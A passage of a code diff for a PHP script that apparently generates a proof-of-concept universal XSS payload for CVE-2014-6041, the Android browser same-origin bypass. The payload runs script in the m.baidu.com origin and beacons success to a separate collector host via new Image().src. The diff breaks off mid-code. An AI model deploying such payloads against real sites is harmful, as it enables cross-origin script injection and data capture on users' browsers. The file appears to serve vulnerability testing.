@@ -1,12 +1,13 @@
 <?php
-// CVE-2014-6041
-// google漏洞编号 37383
-?>
-<?php
+    // CVE-2014-6041
+    // google漏洞编号 37383
+    include "config.php";
 
-    $code = htmlspecialchars(strip_tags($_GET['code']), ENT_QUOTES);
-    $str = "if(document.domain == 'm.baidu.com'){new Image().src='php/set.php?code=".$code."&suc=2';}";
-    //$str = "if(document.domain == 'm.baidu.com'){alert(1)}";
+    $code = $_GET['code'];
+    $code = htmlspecialchars(strip_tags($code), ENT_QUOTES);
+    $setPhp = $DOMAIN."/php/set.php?code=".$code."&suc=2";
+    $str = "if(document.domain == 'm.baidu.com'){new Image().src='".$setPhp."';}";
+    //$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://10.20.230.142/uxss/src/php/set.php?code=".$code."&suc=2';}";
 
     $tmp = str_split($str);
     $result = array();
